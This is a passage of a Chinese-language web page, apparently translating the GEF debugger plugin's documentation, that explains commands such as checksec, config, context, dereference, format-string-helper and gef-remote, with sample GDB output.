canary</span><br></pre></td></tr></table></figure><p><img src="../../../../../../program/writing/images/gef/UDHcCOlht3hN.png" alt="mark"></p><h2 id="capstone-disassemble-命令"><a href="#capstone-disassemble-命令" class="headerlink" title="capstone-disassemble 命令"></a>capstone-disassemble 命令</h2><p>如果已安装 <a href="http://capstone-engine.org/" target="_blank" rel="noopener"><code>capstone</code></a> 库及其Python绑定，则可以使用它来反汇编调试会话中的任何内存。 这个插件的创建是为了提供“GDB”的反汇编功能的替代方案，它有时会让事情变得混乱。</p><p>您可以使用其别名<code>cs-disassemble</code>或<code>cs</code>加要反汇编的位置。 如果没有指定位置，它将使用<code>$pc</code>。</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gef➤ <span class="keyword">cs</span> main</span><br></pre></td></tr></table></figure><p><img src="../../../../../../program/writing/images/gef/seTAmkzMJO99.png" alt="mark"></p><h2 id="checksec-命令"><a href="#checksec-命令" class="headerlink" title="checksec 命令"></a>checksec 命令</h2><p><code>checksec</code> 命令来源于 <a href="https://gef.readthedocs.io/en/latest/commands/www.trapkit.de/tools/checksec.html" target="_blank" rel="noopener"><code>checksec.sh</code></a>。 它提供了一种方便的方法来确定在二进制文件中启用了哪些安全保护。</p><p>您可以在当前调试的进程上使用该命令：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">gef➤</span>  <span class="string">checksec</span></span><br><span class="line"><span class="string">[+]</span> <span class="string">checksec</span> <span class="string">for</span> <span class="string">'/vagrant/test-bin'</span></span><br><span class="line"><span class="attr">Canary:</span>                                           <span class="literal">No</span></span><br><span class="line"><span class="attr">NX Support:</span>                                       <span class="literal">Yes</span></span><br><span class="line"><span class="attr">PIE Support:</span>                                      <span class="literal">No</span></span><br><span class="line"><span class="attr">No RPATH:</span>                                         <span class="literal">Yes</span></span><br><span class="line"><span class="attr">No RUNPATH:</span>                                       <span class="literal">Yes</span></span><br><span class="line"><span class="attr">Partial RelRO:</span>                                    <span class="literal">Yes</span></span><br><span class="line"><span class="attr">Full RelRO:</span>                                       <span class="literal">No</span></span><br></pre></td></tr></table></figure><p>或者直接指定要检查的二进制文件，例如：</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$ </span>gdb -ex <span class="string">"checksec ./tests/test-x86"</span></span><br></pre></td></tr></table></figure><h2 id="config-命令"><a href="#config-命令" class="headerlink" title="config 命令"></a>config 命令</h2><p>除了可以从<code>_~/.gef.rc~</code>读取配置外, 还可以在运行时使用<code>gef config</code>命令配置<code>gef</code>。</p><p>要查看加载的所有命令的所有设置：</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gef➤  gef <span class="built_in">config</span></span><br></pre></td></tr></table></figure><p><img src="../../../../../../program/writing/images/gef/ng9ucXcTKJDJ.png" alt="mark"></p><p>或者获取某一个设置项的值:</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gef➤  gef<span class="built_in"> config </span>pcustom.struct_path</span><br></pre></td></tr></table></figure><p>当然，您可以编辑这些设置的值。 例如，如果要在抵达断点显示当前上下文之前清除屏幕：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gef➤  gef<span class="built_in"> config </span>context.clear_screen 1</span><br></pre></td></tr></table></figure><p>要将<code>GEF</code>的当前设置保存到系统，以使这些选项在所有未来的<code>GEF</code>会话中保持不变，只需运行：</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gef➤  gef save</span><br><span class="line">[+] <span class="keyword">Configuration</span> saved <span class="keyword">to</span> <span class="string">'/home/vagrant/.gef.rc'</span></span><br></pre></td></tr></table></figure><p>启动时，如果<code>gef</code>找到文件<code>${HOME}/.gef.rc</code>，它将自动加载其值。</p><p>要在会话期间重新加载设置，只需运行：</p><figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gef➤  gef restore</span><br><span class="line">[<span class="meta">+</span>] Configuration <span class="keyword">from</span> <span class="string">'/home/hugsy/.gef.rc'</span> restored</span><br></pre></td></tr></table></figure><p>您也可以在<code>gdb</code>会话之外调整此配置文件以满足您的需要。</p><h2 id="context-命令"><a href="#context-命令" class="headerlink" title="context 命令"></a>context 命令</h2><p><img src="../../../../../../program/writing/images/gef/91PFcIyCbRdo.png" alt="mark"></p><p><code>gef</code>（与<code>PEDA</code>或<code>fG! famous gdbinit</code>不同）在遇到断点时提供全面的上下文菜单。</p><ul><li>寄存器上下文框显示当前寄存器值。 红色值表示自上次执行停止以来该寄存器的值已更改。 它可以方便地跟踪值。 也可以通过reg命令访问和/或取消引用寄存器值。</li><li>堆栈上下文框显示堆栈指针寄存器指向的内存中的10个（默认情况下可以调整）条目。 如果这些值是指针，则它们被连续解除引用。</li><li>代码上下文框显示要执行的下一条指令，默认显示10条指令（默认情况下可以调整）。</li></ul><h3 id="编辑上下文布局"><a href="#编辑上下文布局" class="headerlink" title="编辑上下文布局"></a>编辑上下文布局</h3><p><code>gef</code>允许您通过重新排列显示上下文的顺序来配置您自己的显示设置。</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gef➤ gef<span class="built_in"> config </span>context.layout</span><br></pre></td></tr></table></figure><p>目前有6个部分可以显示：</p><ul><li><code>legend</code> : 颜色代码的文字说明</li><li><code>regs</code> : 寄存器的状态</li><li><code>stack</code> : <code>$sp</code> 寄存器指向的内存内容</li><li><code>code</code> : 正在执行的代码</li><li><code>args</code> : 如果在函数调用处停止，则打印调用参数</li><li><code>source</code> : 如果用source编译，这将显示相应的源代码行</li><li><code>threads</code> : 所有线程</li><li><code>trace</code> : 执行调用跟踪</li><li><code>extra</code> : 如果检测到漏洞（易受攻击的格式字符串，堆漏洞等），它将显示在此窗格中</li><li><code>memory</code> : 查看任意内存位置</li></ul><p>要隐藏一个部分，只需使用<code>context.layout</code>设置，并在部分名称前加上<code>-</code>或者省略它。</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gef➤ gef<span class="built_in"> config </span>context.layout <span class="string">"-legend regs stack code args -source -threads -trace extra memory"</span></span><br></pre></td></tr></table></figure><p>此配置不会显示<code>source</code>，<code>threads</code>和<code>trace</code>部分。</p><p><code>memory</code>窗格将显示<code>memory</code>命令指定的所有位置的内容。 例如，</p><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gef➤ <span class="keyword">memory</span> watch $sp <span class="number">0x40</span> byte</span><br></pre></td></tr></table></figure><p>这将打印堆栈的0x40字节的hexdump版本。 此命令便于跟踪内存中任意位置的变化。 跟踪位置可以使用<code>memory unwatch</code>逐个删除，或者与<code>memory reset</code>一起删除。</p><p>大多数部分的大小也可以自定义：</p><ul><li><code>nb_lines_stack</code> ：配置要显示的堆栈行数。</li><li><code>nb_lines_backtrack</code> ：配置要显示的回溯线数。</li><li><code>nb_lines_code</code> 和<code>nb_lines_code_prev</code> ：分别配置在PC之后和之前显示的行数。</li><li><code>context.nb_lines_threads</code> ：确定线程窗格内显示的行数。 在调试大量多线程应用程序（apache2，firefox等）时，这很方便。 它接收一个整数作为值：如果该值为“-1”，则将显示所有线程状态。 否则，如果该值设置为“N”，则最多将显示“N”个线程状态。</li></ul><p>要使堆栈在顶部显示最大堆栈地址（即向下增加堆栈），请启用以下设置：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gef➤ gef<span class="built_in"> config </span>context.grow_stack_down <span class="literal">True</span></span><br></pre></td></tr></table></figure><p>如果保存的指令指针不在显示的堆栈部分内，则创建一个包含已保存的ip并且根据架构指示帧指针的部分。</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x00007fffffffc9e8</span>│+<span class="number">0x00</span>: <span class="number">0x00007ffff7a2d830</span>  →  &lt;__main+<span class="number">240</span>&gt; mov edi, eax    ($current_frame_savedip)</span><br><span class="line"><span class="number">0x00007fffffffc9e0</span>│+<span class="number">0x00</span>: <span class="number">0x00000000004008c0</span>  →  &lt;__init+<span class="number">0</span>&gt; push r15    ← $rbp</span><br><span class="line">. . . (<span class="number">440</span> bytes skipped)</span><br><span class="line"><span class="number">0x00007fffffffc7e8</span>│+<span class="number">0x38</span>: <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x00007fffffffc7e0</span>│+<span class="number">0x30</span>: <span class="number">0x0000000000000026</span> (<span class="string">"&amp;"</span>?)</span><br><span class="line"><span class="number">0x00007fffffffc7d8</span>│+<span class="number">0x28</span>: <span class="number">0x0000000001958ac0</span></span><br><span class="line"><span class="number">0x00007fffffffc7d0</span>│+<span class="number">0x20</span>: <span class="number">0x00007ffff7ffa2b0</span>  →  <span class="number">0x5f6f7364765f5f00</span></span><br><span class="line"><span class="number">0x00007fffffffc7c8</span>│+<span class="number">0x18</span>: <span class="number">0x00007fff00000000</span></span><br><span class="line"><span class="number">0x00007fffffffc7c0</span>│+<span class="number">0x10</span>: <span class="number">0x00007fffffffc950</span>  →  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x00007fffffffc7b8</span>│+<span class="number">0x08</span>: <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x00007fffffffc7b0</span>│+<span class="number">0x00</span>: <span class="number">0x00007fffffffc7e4</span>  →  <span class="number">0x0000000000000000</span>      ← $rsp</span><br></pre></td></tr></table></figure><h3 id="将上下文输出重定向到另一个-TTY-file"><a href="#将上下文输出重定向到另一个-TTY-file" class="headerlink" title="将上下文输出重定向到另一个 TTY/file"></a>将上下文输出重定向到另一个 TTY/file</h3><p>默认情况下，<code>gef</code>上下文将显示在当前TTY上。 这可以通过设置<code>context.redirect</code>变量来覆盖，以将上下文发送到另一个部分。</p><p>为此，请使用<code>gef config</code>选择你希望上下文重定向到的TTY/file/socket等。</p><p>在提示符中输入命令<code>tty</code>：</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ tty</span><br><span class="line">/dev/pts/<span class="number">0</span></span><br></pre></td></tr></table></figure><p>接下来我们把结果告诉 <code>gef</code> !</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gef➤ gef<span class="built_in"> config </span>context.redirect /dev/pts/0</span><br></pre></td></tr></table></figure><p>成功: <img src="../../../../../../program/writing/images/gef/SLRFj2IWzVzx.png" alt="mark"></p><p>要恢复正常，请删除以下值：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gef➤ gef<span class="built_in"> config </span>context.redirect <span class="string">""</span></span><br></pre></td></tr></table></figure><h3 id="举例"><a href="#举例" class="headerlink" title="举例"></a>举例</h3><ul><li>首先显示代码部分，然后寄存器，栈，隐藏其他所有内容：</li></ul><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gef➤ gef<span class="built_in"> config </span>context.layout <span class="string">"code regs stack"</span></span><br></pre></td></tr></table></figure><ul><li>在抵达断点时停止显示上下文部分：</li></ul><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gef➤ gef<span class="built_in"> config </span>context.<span class="builtin-name">enable</span> 0</span><br></pre></td></tr></table></figure><ul><li>在抵达断点时显示上下文部分之前清除屏幕：</li></ul><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gef➤ gef<span class="built_in"> config </span>context.clear_screen 1</span><br></pre></td></tr></table></figure><ul><li>不要对<code>regs</code>部分中的寄存器取消引用（更紧凑）：</li></ul><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gef➤ gef<span class="built_in"> config </span>context.show_registers_raw 1</span><br></pre></td></tr></table></figure><ul><li>不要“显示”被调用的函数的开头。</li></ul><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gef➤  gef<span class="built_in"> config </span>context.peek_calls <span class="literal">False</span></span><br></pre></td></tr></table></figure><ul><li>从寄存器视图中隐藏指定寄存器。</li></ul><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gef➤  gef<span class="built_in"> config </span>context.ignore_registers <span class="string">"<span class="variable">$cs</span> <span class="variable">$ds</span> <span class="variable">$gs</span>"</span></span><br></pre></td></tr></table></figure><h2 id="dereference-命令"><a href="#dereference-命令" class="headerlink" title="dereference 命令"></a>dereference 命令</h2><p><code>dereference</code>命令（也就是PEDA中的别名<code>telescope</code>）旨在简化GDB中地址的解除引用，以确定它实际指向的内容。</p><p>这是一个有用的便利功能，可以在GDB中使用连续的“x / x”手动跟踪值。</p><p>“dereference`需要一个强制参数，一个地址（或符号或寄存器等）来取消引用：</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">gef➤  dereference $<span class="built_in">sp</span></span><br><span class="line"><span class="number">0x00007fffffffe258</span>│+<span class="number">0x00</span>: <span class="number">0x0000000000400489</span>  →  <span class="keyword">hlt</span>     ← $<span class="built_in">rsp</span></span><br><span class="line">gef➤  telescope <span class="number">0x7ffff7b9d8b9</span></span><br><span class="line"><span class="number">0x00007ffff7b9d8b9</span>│+<span class="number">0x00</span>: <span class="number">0x0068732f6e69622f</span> (<span class="string">"/bin/sh"</span>?)</span><br></pre></td></tr></table></figure><p>它还可以选择接受第二个参数，即取消引用的连续地址数（默认为“1”）。</p><p>例如，如果要取消引用函数上下文中的所有堆栈条目（在64位体系结构上）：</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">gef➤  p ($rbp - $rsp)/<span class="number">8</span></span><br><span class="line">$<span class="number">3</span> = <span class="number">4</span></span><br><span class="line">gef➤  dereference $rsp <span class="number">5</span></span><br><span class="line"><span class="number">0x00007fffffffe170</span>│+<span class="number">0x00</span>: <span class="number">0x0000000000400690</span>  →  push r15        ← $rsp</span><br><span class="line"><span class="number">0x00007fffffffe178</span>│+<span class="number">0x08</span>: <span class="number">0x0000000000400460</span>  →  <span class="keyword">xor</span> ebp, ebp</span><br><span class="line"><span class="number">0x00007fffffffe180</span>│+<span class="number">0x10</span>: <span class="number">0x00007fffffffe270</span>  →  <span class="number">0x1</span></span><br><span class="line"><span class="number">0x00007fffffffe188</span>│+<span class="number">0x18</span>: <span class="number">0x1</span></span><br><span class="line"><span class="number">0x00007fffffffe190</span>│+<span class="number">0x20</span>: <span class="number">0x0000000000400690</span>  →  push r15        ← $rbp</span><br></pre></td></tr></table></figure><h2 id="edit-flags-命令"><a href="#edit-flags-命令" class="headerlink" title="edit-flags 命令"></a>edit-flags 命令</h2><p><code>edit-flags</code>命令（别名：<code>flags</code>）提供了一种快速且易于理解的方式来查看和编辑支持它的体系结构的标志寄存器。 如果没有参数，该命令将只返回一个人性化的寄存器标志显示。</p><p>可以按照以下语法提供一个或多个参数：</p><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gef➤ flags [(+|<span class="string">-</span>|<span class="string">~)FLAGNAME ...]</span></span><br></pre></td></tr></table></figure><p>其中<code>FLAGNAME</code>是标志的名称（不区分大小写），而<code>+|-|~</code>表示是否设置，取消设置或切换标志的操作。</p><p>例如，在x86架构上，如果我们不想进行条件跳转（例如<code>jz</code>指令），但我们想要设置<code>Carry</code>标志，只需使用：</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gef➤ flags -<span class="literal">ZERO</span> +CARRY</span><br></pre></td></tr></table></figure><h2 id="elf-info-命令"><a href="#elf-info-命令" class="headerlink" title="elf-info 命令"></a>elf-info 命令</h2><p><code>elf-info</code>（别名<code>elf</code>）提供了有关当前加载的ELF二进制文件的一些基本信息：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">gef➤</span>  <span class="string">elf</span></span><br><span class="line"><span class="attr">Magic                 :</span> <span class="string">7f</span> <span class="number">45</span> <span class="string">4c</span> <span class="number">46</span></span><br><span class="line"><span class="attr">Class                 :</span> <span class="number">0x2</span> <span class="bullet">-</span> <span class="number">64</span><span class="string">-bit</span></span><br><span class="line"><span class="attr">Endianness            :</span> <span class="number">0x1</span> <span class="bullet">-</span> <span class="string">Little-Endian</span></span><br><span class="line"><span class="attr">Version               :</span> <span class="number">0x1</span></span><br><span class="line"><span class="attr">OS ABI                :</span> <span class="number">0x0</span> <span class="bullet">-</span> <span class="string">System</span> <span class="string">V</span></span><br><span class="line"><span class="attr">ABI Version           :</span> <span class="number">0x0</span></span><br><span class="line"><span class="attr">Type                  :</span> <span class="number">0x2</span> <span class="bullet">-</span> <span class="string">Executable</span></span><br><span class="line"><span class="attr">Machine               :</span> <span class="number">0x3e</span> <span class="bullet">-</span> <span class="string">x86-64</span></span><br><span class="line"><span class="attr">Program Header Table  :</span> <span class="number">0x0000000000000040</span></span><br><span class="line"><span class="attr">Section Header Table  :</span> <span class="number">0x0000000000000c98</span></span><br><span class="line"><span class="attr">Header Table          :</span> <span class="number">0x0000000000000040</span></span><br><span class="line"><span class="attr">ELF Version           :</span> <span class="number">0x1</span></span><br><span class="line"><span class="attr">Header size           :</span> <span class="number">0</span> <span class="string">(0x0)</span></span><br><span class="line"><span class="attr">Entry point           :</span> <span class="number">0x0000000000400460</span></span><br></pre></td></tr></table></figure><h2 id="entry-break-命令"><a href="#entry-break-命令" class="headerlink" title="entry-break 命令"></a>entry-break 命令</h2><p><code>entry-break</code>（别名<code>start</code>）命令的目标是在二进制文件中可用的最明显的入口点找到并中断。 由于二进制文件将开始运行，因此一些“PLT”条目也将被解析，从而使进一步的调试变得更容易。</p><p>它将执行以下操作：</p><p>1.查找<code>main</code>。 如果找到，设置临时断点并继续。<br>2.否则，它会查找<code>__libc_start_main</code>。 如果找到，设置临时断点并继续。<br>3.最后，如果找不到前两个符号，它将从ELF头获取入口点，设置断点并运行。 如果ELF二进制文件具有有效结构，则此情况永远不会失败。</p><p><img src="../../../../../../program/writing/images/gef/iXEEe59flVGb.png" alt="mark"></p><h2 id="eval-命令"><a href="#eval-命令" class="headerlink" title="$(eval) 命令"></a>$(eval) 命令</h2><p><code>$</code>命令试图模仿WinDBG中的<code>?</code>命令。</p><p>当提供一个参数时，它将评估表达式，并尝试以各种格式显示结果：</p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">gef➤  $ $pc+<span class="number">1</span></span><br><span class="line"><span class="number">93824992252977</span></span><br><span class="line"><span class="number">0x555555559431</span></span><br><span class="line"><span class="number">0b10101010101010101010101010101011001010000110001</span></span><br><span class="line">b'UUUU\x941'</span><br><span class="line">b'<span class="number">1</span>\x94UUUU'</span><br><span class="line"></span><br><span class="line">gef➤  $ -<span class="number">0x1000</span></span><br><span class="line">-<span class="number">4096</span></span><br><span class="line"><span class="number">0xfffffffffffff000</span></span><br><span class="line"><span class="number">0b1111111111111111111111111111111111111111111111111111000000000000</span></span><br><span class="line">b'\xff\xff\xff\xff\xff\xff\xf0\x00'</span><br><span class="line">b'\x00\xf0\xff\xff\xff\xff\xff\xff'</span><br></pre></td></tr></table></figure><p>有两个参数，它只会计算它们之间的差值：</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">gef➤  vmmap libc</span><br><span class="line">Start              End                Offset             Perm</span><br><span class="line"><span class="number">0x00007ffff7812000</span> <span class="number">0x00007ffff79a7000</span> <span class="number">0x0000000000000000</span> r-x /lib/x86_64-linux-gnu/libc<span class="number">-2.24</span>.so</span><br><span class="line"><span class="number">0x00007ffff79a7000</span> <span class="number">0x00007ffff7ba7000</span> <span class="number">0x0000000000195000</span> --- /lib/x86_64-linux-gnu/libc<span class="number">-2.24</span>.so</span><br><span class="line"><span class="number">0x00007ffff7ba7000</span> <span class="number">0x00007ffff7bab000</span> <span class="number">0x0000000000195000</span> r-- /lib/x86_64-linux-gnu/libc<span class="number">-2.24</span>.so</span><br><span class="line"><span class="number">0x00007ffff7bab000</span> <span class="number">0x00007ffff7bad000</span> <span class="number">0x0000000000199000</span> rw- /lib/x86_64-linux-gnu/libc<span class="number">-2.24</span>.so</span><br><span class="line"></span><br><span class="line">gef➤  $ <span class="number">0x00007ffff7812000</span> <span class="number">0x00007ffff79a7000</span></span><br><span class="line"><span class="number">-1658880</span></span><br><span class="line"><span class="number">1658880</span></span><br><span class="line"></span><br><span class="line">gef➤  $ <span class="number">1658880</span></span><br><span class="line"><span class="number">1658880</span></span><br><span class="line"><span class="number">0x195000</span></span><br><span class="line"><span class="number">0</span>b110010101000000000000</span><br><span class="line">b<span class="string">'\x19P\x00'</span></span><br><span class="line">b<span class="string">'\x00P\x19'</span></span><br></pre></td></tr></table></figure><h2 id="format-string-helper-命令"><a href="#format-string-helper-命令" class="headerlink" title="format-string-helper 命令"></a>format-string-helper 命令</h2><p><code>format-string-helper</code>命令将创建一个<code>GEF</code>特定类型的断点，专门用于在使用GlibC库时检测可能不安全的格式字符串。</p><p>它将针对多个目标使用此新断点，包括：</p><ul><li><code>printf()</code></li><li><code>sprintf()</code></li><li><code>fprintf()</code></li><li><code>snprintf()</code></li><li><code>vsnprintf()</code></li></ul><p>只需调用该命令即可启用此功能。</p><p>“fmtstr-helper`是一个较短的别名。</p><figure class="highlight delphi"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gef➤ fmtstr-<span class="keyword">helper</span></span><br></pre></td></tr></table></figure><p>然后开始执行。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gef➤ r</span><br></pre></td></tr></table></figure><p>如果找到潜在的不安全条目，则断点将触发，停止进程执行，显示触发的原因以及关联的上下文。</p><p><img src="../../../../../../program/writing/images/gef/d9Niw46L8MkV.png" alt="mark"></p><h2 id="functions-命令"><a href="#functions-命令" class="headerlink" title="functions 命令"></a>functions 命令</h2><p><code>functions</code>命令将列出GEF提供的所有 <a href="https://sourceware.org/gdb/onlinedocs/gdb/Convenience-Funs.html" target="_blank" rel="noopener">便利功能</a>。</p><ul><li><code>$_bss([offset])</code> — 返回当前的bss基址加上给定的偏移量。</li><li><code>$_got([offset])</code> — 返回当前的bss基址加上给定的偏移量。</li><li><code>$_heap([offset])</code> — 返回当前堆基地址加上可选的偏移量。</li><li><code>$_pie([offset])</code> — 返回当前的PIE基地址和可选的偏移量。</li><li><code>$_stack([offset])</code> — 返回当前栈基址加上可选的偏移量。</li></ul><p>这些函数可以用作其他命令的参数，以动态计算值。</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">gef➤  deref $_heap() l4</span><br><span class="line"><span class="number">0x0000000000602000</span>│+<span class="number">0x00</span>: <span class="number">0x0000000000000000</span>     ← $r8</span><br><span class="line"><span class="number">0x0000000000602008</span>│+<span class="number">0x08</span>: <span class="number">0x0000000000000021</span> (<span class="string">"!"</span>?)</span><br><span class="line"><span class="number">0x0000000000602010</span>│+<span class="number">0x10</span>: <span class="number">0x0000000000000000</span>     ← $rax, $rdx</span><br><span class="line"><span class="number">0x0000000000602018</span>│+<span class="number">0x18</span>: <span class="number">0x0000000000000000</span></span><br><span class="line">gef➤  deref $_heap(<span class="number">0x20</span>) l4</span><br><span class="line"><span class="number">0x0000000000602020</span>│+<span class="number">0x00</span>: <span class="number">0x0000000000000000</span>     ← $rsi</span><br><span class="line"><span class="number">0x0000000000602028</span>│+<span class="number">0x08</span>: <span class="number">0x0000000000020fe1</span></span><br><span class="line"><span class="number">0x0000000000602030</span>│+<span class="number">0x10</span>: <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x0000000000602038</span>│+<span class="number">0x18</span>: <span class="number">0x0000000000000000</span></span><br></pre></td></tr></table></figure><h2 id="gef-remote-命令"><a href="#gef-remote-命令" class="headerlink" title="gef-remote 命令"></a>gef-remote 命令</h2><p>可以在远程调试环境中使用<code>gef</code>。 所需文件将自动下载并缓存在临时目录（大多数Unix系统上的<code>/tmp/gef</code>）中。如果更改目标文件，请记得手动删除缓存，否则<code>gef</code>将使用旧的版本。</p><h3 id="使用本地副本"><a href="#使用本地副本" class="headerlink" title="使用本地副本"></a>使用本地副本</h3><p>如果你想远程调试你已经拥有的二进制文件，你只需要告诉<code>gdb</code>在哪里找到调试信息。</p><p>例如，如果我们想调试<code>uname</code>，我们在服务器上执行：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ gdbserver 0.0.0.0:1234 /bin/uname</span><br><span class="line">Process /bin/uname created; pid = 32280</span><br><span class="line">Listening on<span class="built_in"> port </span>1234</span><br></pre></td></tr></table></figure><p><img src="../../../../../../program/writing/images/gef/t05eFPr522sI.png" alt="mark"></p><p>在客户端上，只需运行<code>gdb</code>：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ gdb /bin/uname</span><br><span class="line">gef➤ target remote 192.168.56.1:1234</span><br><span class="line">Process /bin/uname created; pid = 10851</span><br><span class="line">Listening on<span class="built_in"> port </span>1234</span><br></pre></td></tr></table></figure><p>或者</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ gdb</span><br><span class="line">gef➤ file /bin/uname</span><br><span class="line">gef➤ target remote <span class="number">192.168</span><span class="number">.56</span><span class="number">.1</span>:<span class="number">1234</span></span><br></pre></td></tr></table></figure><h3 id="没有本地副本"><a href="#没有本地副本" class="headerlink" title="没有本地副本"></a>没有本地副本</h3><p>可以使用<code>gdb</code>内部函数来复制我们的目标二进制文件。</p><p>按照前面的例子，如果我们想调试<code>uname</code>，运行<code>gdb</code>并连接到我们的<code>gdbserver</code>。 为了能够在<code>/proc</code>结构中找到正确的进程，命令<code>gef-remote</code>需要1个参数，即目标主机和端口。 必须提供选项<code>-p</code>并指示远程主机上的进程PID，仅当使用扩展模式（<code>-E</code>）时。</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ gdb</span><br><span class="line">gef➤ gef-remote <span class="number">192.168</span><span class="number">.56</span><span class="number">.1</span>:<span class="number">1234</span></span><br><span class="line">[+] Connected <span class="keyword">to</span> <span class="string">'192.168.56.1:1234'</span></span><br><span class="line">[+] Downloading remote information</span><br><span class="line">[+] Remote information loaded, remember <span class="keyword">to</span> clean <span class="string">'/tmp/gef/10851'</span> <span class="keyword">when</span> your <span class="keyword">session</span> <span class="keyword">is</span> <span 